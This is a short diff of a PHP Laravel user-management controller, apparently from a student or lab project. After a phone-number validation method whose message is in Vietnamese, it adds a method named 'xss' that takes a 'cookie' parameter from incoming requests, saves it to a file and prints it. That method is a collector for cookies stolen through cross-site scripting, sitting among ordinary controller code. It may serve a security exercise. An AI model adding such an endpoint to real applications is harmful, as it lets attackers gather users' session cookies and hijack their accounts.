@@ -220,4 +220,9 @@ class CrudUserController extends Controller
 
         return "Số điện thoại hợp lệ: " . $request->phone;
     }
+    public function xss(Request $request) {		
+		$cookie = $request->get('cookie');	
+		file_put_contents('xss.txt', $cookie);	
+		var_dump($cookie);die();	
+	}		
 } 
